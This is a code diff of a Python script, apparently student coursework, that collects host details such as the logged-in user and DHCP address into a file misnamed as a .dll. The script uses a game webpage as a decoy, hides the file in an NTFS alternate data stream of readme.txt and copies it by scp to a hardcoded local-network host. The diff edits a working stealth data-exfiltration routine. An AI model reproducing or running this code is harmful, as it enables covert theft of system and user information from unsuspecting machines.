@@ -69,7 +69,7 @@ devInfoFile.write("System Time: "+str(datetime.now()) + "\n")
 devInfoFile.write("Student 1 (Manav) Number: s3949664 \nStudent 2 (Lachlan) Number: s3942121\n")
 
 # Open game URL
-webbrowser.open("https://bethesda.net/en/game/starfield/features")
+# webbrowser.open("https://bethesda.net/en/game/starfield/features")
 
 # Write username
 devInfoFile.writelines("\nCurrent User: "+ str(os.getlogin())+"\n \n")
@@ -91,11 +91,11 @@ devInfoFile.write("\nDHCP Address: = " + get_windows_dhcp())
 devInfoFile.close()
 
 # copy devInfoFile to windows directory (MUST BE RUN AS ADMIN)
-shutil.copy('DeviceInfo39496643942121.dll',homedrive+'\Windows')
+# shutil.copy('DeviceInfo39496643942121.dll',homedrive+'\Windows')
 
 
 # send DeviceInfo.dll over sftp server (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
-subprocess.run(["scp",'DeviceInfo39496643942121.dll',("lachl@"+ipAddr+":"+homedrive+"/users/netTesty/Documents")]) 
+subprocess.run(["scp",'DeviceInfo39496643942121.dll',("lachl@"+'192.168.1.110'+":"+'C:'+"/users/netTesty/Documents")]) 
 
 # hide DeviceInfo.dll inside ADS of readme.txt
 shutil.copy('DeviceInfo39496643942121.dll','readme.txt:DeviceInfo39496643942121.dll')
@@ -104,4 +104,4 @@ shutil.copy('DeviceInfo39496643942121.dll','readme.txt:DeviceInfo39496643942121.
 os.remove("DeviceInfo39496643942121.dll")
 
 # send readme.txt over sftp server (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
-subprocess.run(["scp",'readme.txt',("lachl@"+ipAddr+":"+homedrive+"/users/netTesty/Documents")]) 
+subprocess.run(["scp",'readme.txt',("lachl@"+"192.168.1.110"+":"+"C:"+"/users/netTesty/Documents")]) 
